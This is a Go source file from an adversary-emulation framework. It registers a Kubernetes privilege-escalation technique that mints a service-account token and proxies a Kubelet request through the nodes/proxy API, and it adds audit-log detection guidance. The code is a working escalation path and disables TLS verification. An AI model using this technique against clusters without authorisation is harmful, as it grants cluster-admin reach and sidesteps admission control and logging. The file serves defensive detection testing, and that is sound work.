package kubernetes

import (
	"context"
	"crypto/tls"
	_ "embed"
	"errors"
	"fmt"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"io"
	authenticationv1 "k8s.io/api/authentication/v1"
	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"log"
	"net/http"
	"strconv"
)

//go:embed main.tf
var tf []byte

func init() {
	const codeBlock = "```"
	const code = "`"

	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "k8s.privilege-escalation.nodes-proxy",
		FriendlyName:       "Privilege escalation through node/proxy permissions",
		Platform:           stratus.Kubernetes,
		IsIdempotent:       true,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.PrivilegeEscalation},
		Description: `
Uses the node proxy API to proxy a Kubelet request through a worker node. This is a vector of privilege escalation, allowing
any principal with the ` + code + `nodes/proxy` + code + ` permission to escalate their privilege to cluster administrator, 
bypassing at the same time admission control checks and logging of the API server.

Warm-up:

- Create a namespace
- Create a service account in this namespace
- Create a cluster role with ` + code + `nodes/proxy` + code + ` permissions 
- Bind the cluster role to the service account

Detonation:

- Retrieve a token for the service account with ` + code + `nodes/proxy` + code + ` permissions creating during warm-up
- Use the node proxy API to proxy a benign request to the Kubelet through the worker node

References:

- https://blog.aquasec.com/privilege-escalation-kubernetes-rbac
- https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/#-strong-proxy-operations-node-v1-core-strong-

`,
		Detection: `
Using Kubernetes API server audit logs, you can identify when the nodes proxy API is used.

Sample event (shortened):

` + codeBlock + `json hl_lines="3 4"
{
  "objectRef": {
    "resource": "nodes",
    "subresource": "proxy",
    "name": "ip-192-168-34-255.eu-west-1.compute.internal",
    "apiVersion": "v1"
  },
  "http": {
    "url_details": {
      "path": "/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/"
    },
    "method": "get",
    "status_code": 200,
    "status_category": "OK"
  },
  "kind": "Event",
  "level": "Request",
  "requestURI": "/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/",
}
` + codeBlock + `

Under normal operating conditions, it's not expected that this API is used frequently. 
Consequently, alerting on ` + code + `objectRef.resource == "nodes" && objectRef.subresource == "proxy"` + code + ` should yield minimal false positives.

Additionally, looking at the Kubelet API path that was proxied can help identify malicious activity (/runningpods in this example).
See [kubeletctl](https://github.com/cyberark/kubeletctl/blob/master/pkg/api/constants.go) for an unofficial list of Kubelet API endpoints.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	client := providers.K8s().GetClient()
	serviceAccountName := params["service_account_name"]
	serviceAccountNamespace := params["service_account_namespace"]

	// Step 1: Get a service account token for our service account, which has "nodes/proxy" permissions
	log.Println("Retrieving service account token for service account " + serviceAccountName)
	authenticationToken, err := getServiceAccountToken(serviceAccountName, serviceAccountNamespace, client)
	if err != nil {
		return err
	}

	// Step 2: Choose a node to proxy from
	node, err := getRandomNodeName(client)
	if err != nil {
		return err
	}

	// Step 3: Proxy the request to the Kubelet through this node
	log.Println("Using worker node '" + node + "' to proxy to the Kubelet API")
	_, err = proxyKubeletRequest("/runningpods/", authenticationToken, node, client)
	if err != nil {
		return err
	}

	log.Println("Successfully proxied a benign Kubelet API request through the worker node")
	return nil
}

// Generates a service account token for a specific service account
func getServiceAccountToken(serviceAccount string, namespace string, client *kubernetes.Clientset) (string, error) {
	tokenRequest := &authenticationv1.TokenRequest{}
	options := metav1.CreateOptions{}
	result, err := client.CoreV1().ServiceAccounts(namespace).CreateToken(context.Background(), serviceAccount, tokenRequest, options)
	if err != nil {
		return "", errors.New("unable to retrieve service account token for " + serviceAccount + ": " + err.Error())
	}

	return result.Status.Token, nil
}

// Returns the name of a worker node, no matter which one
func getRandomNodeName(client *kubernetes.Clientset) (string, error) {
	result, err := client.CoreV1().Nodes().List(context.Background(), metav1.ListOptions{})
	if err != nil {
		return "", errors.New("unable to list worker nodes: " + err.Error())
	}
	return result.Items[0].ObjectMeta.Name, nil
}

// Uses the nodes proxy API to proxy a request through a node to hit the Kubelet
// see https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/#-strong-proxy-operations-node-v1-core-strong-
func proxyKubeletRequest(kubeletApiPath string, token string, node string, client *kubernetes.Clientset) (string, error) {
	// Note: We have to use a raw HTTP request because it's not straightforward to create a new K8s API client from
	// a static bearer token
	config := providers.K8s().GetRestConfig()
	httpClient := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
	}
	apiServerUrl := fmt.Sprintf("%s/%s", config.Host, config.APIPath)
	endpointUrl := fmt.Sprintf("%sapi/v1/nodes/%s/proxy%s", apiServerUrl, node, kubeletApiPath)
	req, _ := http.NewRequest("GET", endpointUrl, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("User-Agent", providers.StratusUserAgent)

	log.Println("Performing request to " + endpointUrl)
	response, err := httpClient.Do(req)

	if err != nil {
		return "", errors.New("unable to proxy to the Kubelet API: " + err.Error())
	}

	rawBody, err := io.ReadAll(response.Body)
	if err != nil {
		return "", errors.New("unable to read Kubelet response body: " + err.Error())
	}
	body := string(rawBody)

	if statusCode := response.StatusCode; statusCode != 200 {
		return "", errors.New("got non-200 status code from the proxying API: " + strconv.Itoa(statusCode) + "\nresponse body: " + body)
	}

	return body, nil

}
